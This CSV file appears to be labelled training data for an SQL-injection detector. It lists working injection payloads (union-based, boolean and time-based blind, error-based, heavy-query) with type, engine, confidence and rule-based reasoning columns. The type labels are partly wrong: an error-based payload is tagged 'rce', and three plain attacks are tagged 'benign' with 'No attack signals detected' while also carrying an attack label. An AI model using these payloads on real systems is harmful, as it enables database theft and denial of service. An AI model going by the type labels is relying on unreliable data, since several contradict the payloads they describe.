row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10756,"1' in boolean mode ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) #",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
10757,"-1988 where 4597 = 4597 union all select 4597,4597,4597,4597,4597,4597--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10758,"-4923"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""afjc"" like ""afjc",1,,boolean_blind,postgresql,0.95,"like "" detected — boolean_blind injection (priority 8) on postgresql",rule-based
10759,"1' ) and make_set ( 6488 = 5525,5525 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10760,1' in boolean mode ) union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10761,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""rugr"" = ""rugr",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10762,1' ) where 8086 = 8086 and 1430 = 7941--,1,,boolean_blind,generic,0.95,8086 = 8086 and detected — boolean_blind injection (priority 8) on generic,rule-based
10763,"1"" ) as xaye where 5343 = 5343 and 4355 = 7475#",1,,boolean_blind,generic,0.95,5343 = 5343 and detected — boolean_blind injection (priority 8) on generic,rule-based
10764,"1"" ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10765,"1'|| ( select 'bccx' where 5881 = 5881 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10766,"-8487' ) where 9655 = 9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10767,-4389' ) ) ) or ( 1139 = 3499 ) *3499 and ( ( ( 'qoch' = 'qoch,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
10768,"-4033' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'ouup' = 'ouup",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
10769,1' where 6406 = 6406,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
